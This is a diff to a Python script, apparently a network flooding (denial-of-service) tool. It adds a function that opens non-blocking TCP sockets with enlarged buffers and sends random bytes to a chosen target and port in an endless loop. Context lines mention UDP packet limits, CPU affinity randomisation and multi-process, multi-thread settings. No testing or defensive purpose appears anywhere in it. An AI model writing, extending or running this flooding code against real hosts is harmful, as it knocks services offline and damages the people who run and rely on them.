@@ -5,6 +5,10 @@ import random
 import platform
 import psutil
 import asyncio
+import selectors
+import socket
+import ssl
+from aiohttp import ClientSession
 
 SOCK_BUFFER_SIZE = 1024 * 1024  # 1 MB
 MAX_UDP_PACKET_SIZE = 65507  # Max size for UDP
@@ -46,6 +50,38 @@ def randomize_cpu_affinity():
     except Exception as e:
         print(f"[ERROR] Exception occurred while setting CPU affinity: {e}")
 
+async def send_tcp_packet(target, port, selector, packet_size=MAX_TCP_PACKET_SIZE):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFFER_SIZE)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFFER_SIZE)
+        sock.setblocking(False)
+        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+        try:
+            sock.connect((target, port))
+        except BlockingIOError:
+            pass  # Non-blocking connect
+
+        selector.register(sock, selectors.EVENT_WRITE)
+        data = random._urandom(packet_size)
+
+        while True:
+            events = selector.select(timeout=0.01)
+            for key, _ in events:
+                try:
+                    sock.send(data)
+                except (ConnectionRefusedError, OSError) as e:
+                    print(f"[ERROR] TCP connection error: {e}")
+                    return  # Exit on connection error
+    except Exception as e:
+        print(f"[ERROR] Exception in TCP sending: {e}")
+    finally:
+        try:
+            selector.unregister(sock)
+            sock.close()
+        except Exception as e:
+            print(f"[ERROR] Exception closing TCP socket: {e}")
 
 def run_ip_info(ip_address, port, num_processes, num_threads_per_process, protocol, packet_size):
     randomize_cpu_affinity()
